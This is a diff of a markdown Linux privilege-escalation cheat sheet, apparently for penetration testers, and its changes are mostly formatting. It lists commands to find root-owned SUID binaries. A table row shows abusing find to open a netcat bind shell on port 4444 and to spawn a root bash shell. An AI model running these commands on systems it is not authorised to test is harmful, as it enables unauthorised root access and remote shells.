@@ -25,13 +25,12 @@ Who can execute code as root (probably will get a permission denied)?
 Can I execute code as root (you will need the user's password)?  
 `sudo -l`
 
-What executables have SUID bit that can be executed as another user?
+What executables have SUID bit that can be executed as another user?  
 `find / -user root -perm -4000 -print 2>/dev/null`  
 `find / -perm -u=s -type f 2>/dev/null`  
 `find / -user root -perm -4000 -exec ls -ldb {} \;`  
 
-
-If any of the following commands appear on the list of SUID or SUDO commands, they can be used for privledge escalation
+If any of the following commands appear on the list of SUID or SUDO commands, they can be used for privledge escalation:
 
 | SUID / SUDO Executables            | Priv Esc Command                                                              |
 |------------------------------------|-------------------------------------------------------------------------------|
@@ -39,7 +38,8 @@ If any of the following commands appear on the list of SUID or SUDO commands, th
 | awk                                |                                                                               |
 | python                             |                                                                               |
 | perl                               |                                                                               |
-| find                               | `find /home -exec nc -lvp 4444  -e /bin/bash \;<br>  find /home -exec /bin/bash \;` |
+| find                               | `find /home -exec nc -lvp 4444  -e /bin/bash \;  
+find /home -exec /bin/bash \;` |
 | xxd                                |                                                                               |
 | vi                                 |                                                                               |
 | bash                               |                                                                               |
